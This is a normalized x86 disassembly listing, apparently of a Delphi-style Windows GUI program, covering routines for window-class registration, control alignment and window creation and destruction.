lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
lea ecx [ ebp - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xa8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x10 ] eax
xor eax eax
mov al [ ebp - 0x5 ]
cmp eax 0x6
ja r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x2
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x2
je r-xdata
sub eax edx
mov [ ebp - 0xc ] eax
adc edx 0x0
mov eax [ ebp - 0x4 ]
mov [ eax + 0x62 ] 0x1
xor eax eax
push ebp
push sub_443381
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x62 ] 0x0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x94 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8c ]
push eax
call MulDiv
mov edx [ ebp - 0x18 ]
sar edx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x94 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x8c ]
mov edx [ ebp - 0x1c ]
sub edx eax
mov [ ebp - 0x10 ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x94 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x8c ]
mov edx [ ebp - 0x1c ]
sub edx eax
mov [ ebp - 0x18 ] edx
jmp r-xdata
sub eax edx
mov [ ebp - 0x10 ] eax
adc edx 0x0
sub_443510
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
cmp eax [ ebp - 0x14 ]
jne r-xdata
xor edx edx
mov dl [ ebp - 0x5 ]
cmp edx 0x5
ja r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
cmp edx [ ebp - 0x18 ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
jmp [ edx * 4 + jump_table_44353f ]
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
sub edx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
sub [ eax + 0x4 ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
sub edx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add [ eax + 0xc ] edx
jmp r-xdata
mov edx [ ebp - 0x14 ]
sub edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
sub [ eax ] edx
jmp r-xdata
mov edx [ ebp - 0x14 ]
sub edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add [ eax + 0x8 ] edx
jmp r-xdata
mov edx [ ebp - 0x14 ]
sub edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add [ eax + 0x8 ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
sub edx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add [ eax + 0xc ] edx
sub_4435c8
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_443dbc
dec eax
test eax eax
jl r-xdata
test bl bl
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
cmp bl [ eax + 0x5b ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
inc eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec [ ebp - 0x8 ]
jne r-xdata
test bl bl
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
call sub_41a040
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
test [ eax + 0x1c ] 0x10
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] bl
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp - 0x4 ]
call sub_41a19c
lea ecx [ ebp - 0x18 ]
mov edx ebx
call sub_443188
pop ecx
inc [ ebp - 0x4 ]
dec [ ebp - 0x8 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_443d80
mov edi eax
cmp bl [ edi + 0x5b ]
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp edi [ eax - 0x10 ]
je r-xdata
cmp [ edi + 0x57 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
xor esi esi
jmp r-xdata
mov eax [ r-xdata ]
and eax [ edi + 0x50 ]
mov edx [ r-xdata ]
cmp edx eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp esi [ eax + 0x8 ]
jge r-xdata
test [ edi + 0x1c ] 0x10
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov ecx edi
mov edx esi
call sub_41a218
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx esi
call sub_41a19c
mov edx eax
mov ecx ebx
mov eax edi
call sub_4430fc
pop ecx
test al al
je r-xdata
test [ edi + 0x51 ] 0x4
jne r-xdata
inc esi
sub_443738
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xfffffffc
mov bl 0x1
mov eax [ edi ]
call sub_443dbc
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
xor ebx ebx
mov eax [ edi ]
mov edx esi
call sub_443d80
cmp [ eax + 0x5b ] 0x0
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ edi ]
mov edx esi
call sub_443d80
mov dl [ r-xdata ]
cmp dl [ eax + 0x61 ]
jne r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
sub_44378c
push ebp
mov ebp esp
add esp 0xfffffff0
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a8 ] 0x0
je r-xdata
push ebp
call sub_443738
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031ec
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_44386b
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
mov al 0x1
call sub_4435c8
pop ecx
push ebp
mov al 0x2
call sub_4435c8
pop ecx
push ebp
mov al 0x3
call sub_4435c8
pop ecx
push ebp
mov al 0x4
call sub_4435c8
pop ecx
push ebp
mov al 0x5
call sub_4435c8
pop ecx
push ebp
mov al 0x6
call sub_4435c8
pop ecx
push ebp
xor eax eax
call sub_4435c8
pop ecx
mov eax [ ebp - 0x4 ]
mov si 0xffc7
call sub_403418
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_40321c
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x17c ] 0x0
je r-xdata
pop esi
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov si 0xffee
call sub_403418
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x17c ]
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x2c ]
sub_443890
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4473c8
test al al
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x8
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x160 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_443924
xor eax eax
push ebp
push sub_443917
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x90 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xffef
mov eax [ ebp - 0x4 ]
call sub_44392c
retn
mov eax [ ebp - 0x4 ]
or [ eax + 0x54 ] 0x10
jmp r-xdata
sub_443954
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031ec
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_443a19
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4402a8
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
call sub_443dbc
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0xc ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_443a20
mov eax [ ebp - 0xc ]
call sub_40321c
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_443d80
mov edx eax
mov eax [ ebp - 0xc ]
call sub_41a040
mov edx [ ebp - 0x8 ]
sub edx [ edi + 0x48 ]
sub edx [ edi + 0x40 ]
mov eax edi
call sub_440014
push 0x0
mov edx esi
mov eax [ ebp - 0xc ]
call sub_41a19c
xor ecx ecx
mov edx 0xb03e
call sub_441a58
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_443d80
mov edi eax
mov eax [ edi + 0x4 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x4 ]
jne r-xdata
sub_443a28
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_443dbc
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031ec
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_443924
xor edx edx
push ebp
push sub_443b0f
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
call sub_443dbc
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffc0
call sub_403418
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
jmp r-xdata
inc edi
xor ebx ebx
mov eax [ ebp - 0xc ]
mov ebx [ eax + 0x8 ]
test ebx ebx
jg r-xdata
inc ebx
dec edi
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_443d80
mov edx eax
mov eax [ ebp - 0xc ]
call sub_41a040
mov edx ebx
dec edx
mov eax [ ebp - 0xc ]
call sub_41a19c
cmp [ eax + 0x5b ] 0x3
jne r-xdata
mov eax [ ebp - 0xc ]
call sub_40321c
mov eax [ ebp - 0x4 ]
call sub_44392c
retn
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_443d80
mov al [ eax + 0x5b ]
add al 0xfd
sub al 0x2
jae r-xdata
mov dl 0x3
call sub_43fdb8
mov dl 0x4
call sub_43fdb8
jmp r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x8 ]
dec edx
mov eax [ ebp - 0xc ]
call sub_41a08c
sub_443b7c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_4576d8
test eax eax
je r-xdata
pop esi
pop ebx
retn
mov ecx ebx
mov edx esi
call sub_45b3fc
sub_443b9c
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_4033a8
test al al
je r-xdata
lea eax [ esi + 0x198 ]
mov edx ebx
call sub_43f198
lea eax [ esi + 0x19c ]
mov edx ebx
call sub_43f198
lea eax [ esi + 0x194 ]
mov edx ebx
call sub_43f198
jmp r-xdata
mov [ ebx + 0x30 ] esi
sub_443be8
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4033a8
test al al
je r-xdata
lea eax [ esi + 0x198 ]
mov edx ebx
call sub_43f1c0
lea eax [ esi + 0x194 ]
mov edx ebx
call sub_43f1c0
lea eax [ esi + 0x19c ]
mov edx ebx
call sub_43f1c0
jmp r-xdata
xor eax eax
mov [ ebx + 0x30 ] eax
pop esi
pop ebx
retn
sub_443c30
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov edx edi
mov eax ebx
mov si 0xfff5
call sub_403418
push 0x1
mov esi ebx
mov ecx esi
mov edx 0xb02c
mov eax edi
call sub_441a58
mov edx ebx
mov eax edi
call sub_443b9c
test [ ebx + 0x1c ] 0x2
jne r-xdata
push 0x1
mov ecx esi
mov edx 0xb036
mov eax edi
call sub_441a58
pop edi
pop esi
pop ebx
retn
push 0x0
xor ecx ecx
mov edx 0xb009
mov eax ebx
call sub_441a58
push 0x0
xor ecx ecx
mov edx 0xb008
mov eax ebx
call sub_441a58
push 0x0
xor ecx ecx
mov edx 0xb023
mov eax ebx
call sub_441a58
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax ebx
call sub_441a58
mov eax ebx
mov edx [ r-xdata ]
call sub_4033a8
test al al
je r-xdata
mov eax edi
call sub_4473c8
test al al
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb011
mov eax ebx
call sub_441a58
mov eax edi
call sub_444780
jmp r-xdata
mov edx ebx
mov eax edi
call sub_443890
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
sub_443d04
push ebx
push esi
push edi
push ebp
mov ebx edx
mov esi eax
push 0x0
mov edi ebx
mov ecx edi
mov edx 0xb036
mov eax esi
call sub_441a58
mov eax ebx
mov edx [ r-xdata ]
call sub_4033a8
test al al
je r-xdata
mov eax esi
call sub_4473c8
test al al
je r-xdata
mov dl 0x1
mov ebp ebx
mov eax ebp
call sub_443b7c
mov eax ebp
call sub_4445e4
jmp r-xdata
mov edx ebx
mov eax esi
call sub_443be8
push 0x0
mov ecx edi
mov edx 0xb02c
mov eax esi
call sub_441a58
mov eax esi
call sub_44394c
pop ebp
pop edi
pop esi
pop ebx
retn
xor ecx ecx
mov dl [ ebx + 0x57 ]
mov eax ebx
call sub_440cec
sub_443d80
push ebx
push esi
push edi
push ebp
mov edi edx
mov ebx eax
mov ebp [ ebx + 0x198 ]
test ebp ebp
je r-xdata
xor esi esi
mov esi [ ebp + 0x8 ]
jmp r-xdata
mov edx edi
sub edx esi
mov eax [ ebx + 0x19c ]
call sub_41a19c
mov edx edi
mov eax ebp
call sub_41a19c
jmp r-xdata
cmp esi edi
jle r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
sub_443ddc
push ebx
push esi
push edi
push ebp
push ecx
mov esi edx
mov [ esp ] eax
mov eax [ esp ]
call sub_443dbc
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
mov edx edi
mov eax [ esp ]
call sub_443d80
mov ebp eax
mov edx esi
mov eax [ ebp + 0x3c ]
call [ ebp + 0x38 ]
cmp [ esi + 0xc ] 0x0
jne r-xdata
sub_443e1c
add esp 0xfffffff0
movzx edx dx
mov [ esp ] edx
xor edx edx
mov [ esp + 0x4 ] edx
xor edx edx
mov [ esp + 0x8 ] edx
xor edx edx
mov [ esp + 0xc ] edx
mov edx esp
call sub_443ddc
add esp 0x10
retn
sub_443e44
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edi [ ebx + 0x34 ]
lea eax [ ebx + 0x24 ]
push eax
push esi
mov eax [ rw-data ]
push eax
call GetClassInfoA
test eax eax
jne r-xdata
mov [ ebx + 0x34 ] edi
mov eax [ ebx + 0x24 ]
and eax 0xffffbf1f
or eax 0x3
mov [ ebx + 0x24 ] eax
lea eax [ ebx + 0x24 ]
push eax
push esi
push 0x0
call GetClassInfoA
test eax eax
jne r-xdata
lea eax [ ebx + 0x24 ]
push eax
push esi
mov eax [ rw-data ]
mov eax [ eax ]
push eax
call GetClassInfoA
test eax eax
jne r-xdata
lea eax [ ebx + 0x24 ]
push eax
push esi
mov eax [ ebx + 0x34 ]
push eax
call GetClassInfoA
sub_443eb0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax ebx
call sub_440ee8
test al al
je r-xdata
mov eax ebx
call sub_440f18
test al al
je r-xdata
or [ edi ] 0x2000
mov eax ebx
mov si 0xffc8
call sub_403418
test al al
je r-xdata
or [ edi ] 0x4000
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffca
call sub_403418
test al al
jne r-xdata
mov eax ebx
mov si 0xffca
call sub_403418
cmp al 0x1
jne r-xdata
or [ edi ] 0x1000
jmp r-xdata
or [ edi ] 0x0
sub_443f18
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_444036
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
xor ecx ecx
mov edx 0x8c
call sub_402c30
mov eax [ esi + 0x64 ]
mov [ ebx ] eax
mov [ ebx + 0x4 ] 0x44000000
lea edx [ ebx + 0x8 ]
mov eax esi
call sub_443eb0
test [ esi + 0x50 ] 0x1
je r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
or [ ebx + 0x4 ] 0x2000000
or [ ebx + 0x8 ] 0x10000
cmp [ esi + 0x1a4 ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov eax [ esi + 0x40 ]
mov [ ebx + 0xc ] eax
mov eax [ esi + 0x44 ]
mov [ ebx + 0x10 ] eax
mov eax [ esi + 0x48 ]
mov [ ebx + 0x14 ] eax
mov eax [ esi + 0x4c ]
mov [ ebx + 0x18 ] eax
mov edi [ esi + 0x30 ]
test edi edi
je r-xdata
or [ ebx + 0x4 ] 0x10000
or [ ebx + 0x4 ] 0x8000000
mov eax [ esi + 0x190 ]
mov [ ebx + 0x1c ] eax
mov eax edi
call sub_4470c4
mov [ ebx + 0x1c ] eax
jmp r-xdata
mov [ ebx + 0x24 ] 0xb
mov eax DefWindowProcA
mov [ ebx + 0x28 ] eax
push 0x7f00
push 0x0
call LoadCursorA
mov [ ebx + 0x3c ] eax
xor eax eax
mov [ ebx + 0x40 ] eax
mov eax [ rw-data ]
mov [ ebx + 0x34 ] eax
lea edx [ ebp - 0x104 ]
mov eax [ esi ]
call sub_40316c
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_4041d0
mov edx [ ebp - 0x4 ]
lea eax [ ebx + 0x4c ]
call sub_408928
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44403d
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
sub_444044
push ebp
mov ebp esp
add esp 0xffffff40
push ebx
push esi
xor edx edx
mov [ ebp - 0xc0 ] edx
mov esi eax
xor eax eax
push ebp
push sub_444205
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x8c ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x98 ]
cmp [ ebp - 0x70 ] 0x0
jne r-xdata
mov eax [ ebp - 0x64 ]
mov [ esi + 0x174 ] eax
lea eax [ ebp - 0xb4 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x58 ]
push eax
call GetClassInfoA
cmp eax 0x1
sbb eax eax
inc eax
test al al
je r-xdata
test [ ebp - 0x85 ] 0x40
je r-xdata
test al al
je r-xdata
mov edx sub_43d698
cmp edx [ ebp - 0xb0 ]
je r-xdata
mov ebx [ esi + 0x4 ]
test ebx ebx
je r-xdata
mov [ ebp - 0x64 ] sub_43d698
lea eax [ ebp - 0x40 ]
mov [ ebp - 0x44 ] eax
lea eax [ ebp - 0x68 ]
push eax
call RegisterClassA
test ax ax
jne r-xdata
mov eax [ ebp - 0x58 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
call UnregisterClassA
mov [ rw-data ] esi
lea edx [ ebp - 0x8c ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x9c ]
cmp [ esi + 0x180 ] 0x0
jne r-xdata
mov eax [ esi + 0x8 ]
mov [ ebp - 0xbc ] eax
mov [ ebp - 0xb8 ] 0xb
lea eax [ ebp - 0xbc ]
push eax
push 0x0
lea edx [ ebp - 0xc0 ]
mov eax [ rw-data ]
call sub_405e60
mov ecx [ ebp - 0xc0 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b900
call sub_4039a8
test [ ebx + 0x1c ] 0x2
je r-xdata
call sub_40ce50
push 0xfffffff0
mov eax [ esi + 0x180 ]
push eax
call GetWindowLongA
test eax 0x40000000
je r-xdata
call sub_40ce50
mov eax ebx
mov edx [ r-xdata ]
call sub_4033a8
test al al
je r-xdata
mov eax [ esi + 0x64 ]
call sub_408ac8
xor eax eax
mov [ esi + 0x64 ] eax
mov eax esi
call sub_4473d4
push 0x1
mov eax [ esi + 0x68 ]
call sub_422ecc
mov ecx eax
mov edx 0x30
mov eax esi
call sub_441a58
cmp [ esi + 0x5c ] 0x0
je r-xdata
push 0xfffffff4
mov eax [ esi + 0x180 ]
push eax
call GetWindowLongA
test eax eax
jne r-xdata
mov eax ebx
call sub_4470c4
mov [ ebp - 0x70 ] eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44420c
lea eax [ ebp - 0xc0 ]
call sub_403f6c
retn
mov eax esi
mov si 0xffee
call sub_403418
mov eax [ esi + 0x180 ]
push eax
push 0xfffffff4
push eax
call SetWindowLongA
sub_444214
push ebx
push esi
mov ebx edx
mov esi eax
mov eax [ ebx + 0x4 ]
push eax
mov eax [ ebx + 0xc ]
push eax
mov eax [ ebx + 0x10 ]
push eax
mov eax [ ebx + 0x14 ]
push eax
mov eax [ ebx + 0x18 ]
push eax
mov eax [ ebx + 0x1c ]
push eax
push 0x0
mov eax [ ebx + 0x34 ]
push eax
mov eax [ ebx + 0x20 ]
push eax
mov ecx [ ebx ]
lea edx [ ebx + 0x4c ]
mov eax [ ebx + 0x8 ]
call sub_406d18
mov [ esi + 0x180 ] eax
pop esi
pop ebx
retn
sub_444254
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_41dfcc
mov eax esi
call sub_41df1c
mov [ ebx + 0x1fa ] eax
mov eax esi
call sub_41df1c
mov [ ebx + 0x1fe ] eax
or [ ebx + 0x98 ] 0x20
mov eax esi
call sub_41dfd4
pop esi
pop ebx
retn
sub_44428c
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ esp + 0x8 ]
mov [ ebx + 0x1fa ] eax
mov eax [ esp + 0xc ]
mov [ ebx + 0x1fe ] eax
mov eax esi
call sub_41f818
mov edx [ ebx + 0x1fa ]
mov eax esi
call sub_41f7a4
mov edx [ ebx + 0x1fe ]
mov eax esi
call sub_41f7a4
mov eax esi
call sub_41f820
add esp 0x10
pop esi
pop ebx
retn
sub_4442f4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x1 ] 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ebx [ eax + 0x20 ]
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x198 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ ebx + 0x1fa ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add eax 0x1fa
call sub_4442e0
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x19c ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov [ ebp - 0x1 ] 0x0
mov edx [ ebp + 0x8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov al [ r-xdata ]
cmp al [ edi + 0x61 ]
jne r-xdata
inc esi
dec ebx
jne r-xdata
mov al [ r-xdata ]
cmp al [ edi + 0x61 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x198 ]
mov edx esi
call sub_41a19c
mov edi eax
cmp [ edi + 0x5b ] 0x0
jne r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x19c ]
mov edx esi
call sub_41a19c
mov edi eax
cmp [ edi + 0x5b ] 0x0
jne r-xdata
sub_4443cc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_441d90
mov eax [ ebp - 0x8 ]
push eax
push sub_444254
mov eax [ ebp - 0x8 ]
push eax
push sub_44428c
push ebp
call sub_4442f4
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_444428
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_440818
mov esi eax
cmp esi 0x1
jge r-xdata
lea eax [ esi + 0x1 ]
call sub_408a7c
mov edi eax
mov [ ebx + 0x64 ] edi
mov eax edi
call sub_408a90
mov ecx eax
mov edx edi
mov eax ebx
call sub_440828
mov eax r-xdata
call sub_408a9c
mov [ ebx + 0x64 ] eax
jmp r-xdata
call sub_43f2cc
mov eax ebx
mov edx [ eax ]
call [ edx + 0xac ]
pop edi
pop esi
pop ebx
retn
sub_444480
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
or [ eax + 0x54 ] 0x200
xor eax eax
push ebp
push sub_4444cd
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x180 ]
push eax
call DestroyWindow
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4444d4
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xfdff
retn
call sub_40ce50
sub_4444e4
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov eax [ edi + 0x19c ]
mov edx ebx
call sub_41a1f8
mov esi eax
inc esi
mov eax [ edi + 0x19c ]
mov ebx [ eax + 0x8 ]
dec ebx
sub ebx esi
jl r-xdata
xor eax eax
inc ebx
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0x19c ]
mov edx esi
call sub_41a19c
